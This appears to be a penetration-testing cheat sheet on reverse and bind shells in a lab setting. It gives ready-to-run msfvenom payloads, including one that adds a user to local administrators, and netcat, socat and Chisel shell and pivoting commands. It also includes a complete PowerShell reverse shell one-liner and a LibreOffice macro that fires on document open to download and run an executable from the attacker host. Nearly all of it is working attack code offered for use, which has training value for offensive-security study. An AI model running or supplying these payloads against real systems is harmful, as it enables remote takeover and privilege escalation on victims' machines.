# Reverse/Bind Shells

## <mark style="color:red;">Shell Generator</mark>

You can get a shell easily from here: [https://www.revshells.com/](https://www.revshells.com/)

### <mark style="color:blue;">Upgrading a Non-Interactive Shell</mark>

```python
python -c 'import pty; pty.spawn("/bin/bash");'
[Ctrl + Z]
stty raw -echo; fg
```

## <mark style="color:red;">Msfvenom</mark>

Windows 10 x64 reverse shell with **msfvenom**:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o shell_53.exe
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.11 LPORT=443 -f exe -o shell_443.exe
```

Using msfvenom to execute a specific command:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators <USERNAME_TO_ADD> /add" -f exe -o file.exe
```

Run process without spawn new window and loose non-TTY shell:

```
> start-process -nonewwindow -filepath ./shell.exe
```

## <mark style="color:red;">**Netcat Bind Shell**</mark>

Windows / Setup bind shell:

```bash
C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.0.22
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.11.0.1

C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
listening on [any] 4444 ...
```

Kali / Calling bind shell:

```bash
kali@kali:~$ nc -nv 10.11.0.22 4444
(UNKNOWN) [10.11.0.22] 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.0.22
```

## <mark style="color:red;">Netcat Reverse Shell</mark>

Windows:

```bash
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
```

Kali:

```bash
kali@kali:~$ ip address show eth0 | grep inet
          inet 10.11.0.4/16  brd 10.11.255.255  scope global dynamic eth0
          
kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

The connection is received by Netcat on the Windows machine as shown below:

```bash
C:\Users\offsec>nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43482

ip address show eth0 | grep inet
          inet 10.11.0.4/16  brd 10.11.255.255  scope global dynamic eth0
```

## <mark style="color:red;">Socat Reverse Shell</mark>

Listen:

```bash
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

Connect:

```bash
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

## <mark style="color:red;">Socat Encrypted Bind Shell</mark>

Generating SSL certificate:

```bash
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
```

Creating .pem file:

```bash
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

Listen:

```bash
kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

Connect:

```bash
C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```

## <mark style="color:red;">Chisel</mark>

How it works: [https://ap3x.github.io/posts/pivoting-with-chisel/](https://ap3x.github.io/posts/pivoting-with-chisel/)

Download it from here:

{% embed url="https://github.com/jpillora/chisel/releases" %}

Reverse pivot:

```bash
./chisel server -p 9002 -reverse -v #On Kali
./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888 #On victim machine
```

SOCKS5 / Proxychains Configuration:

```bash
./chisel server -p 9002 -reverse -v #On Kali
./chisel client <RHOST>:9002 R:socks #On victim machine
```

## <mark style="color:red;">PowerShell Reverse Shell</mark>

Listen:

```bash
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
```

Connect:

```bash
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Result:

```bash
kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515

PS C:\Users\offsec>
```

## <mark style="color:red;">PHP Reverse Shell</mark>

A php reverse shell from pentest monkey:

{% embed url="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" %}

## <mark style="color:red;">LibreOffice</mark>

If you can upload an ODT LibreOffice file and execute it you can insert a macro inside it, as follow.

First insert the reverse shell payload for Windows inside a **reverse.ps1** file:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

We can create a new basic macro and save it:

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>ODT Macro</p></figcaption></figure>

The ODT Macro content is the following:

```powershell
Sub Main
    Shell("cmd /c certutil -urlcache -split -f http://<kali_ip>:80/shell_80.exe C:\\Windows\\Tasks\\shell_80.exe")
    Shell("cmd /c C:\Windows\Tasks\shell_80.exe")
End Sub
```

Now link it to the “Open Document” event. Under Tools -> Customize -> Events.

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Save. Start a netcat listener and a python web server and upload the odt file. Get the shell back.
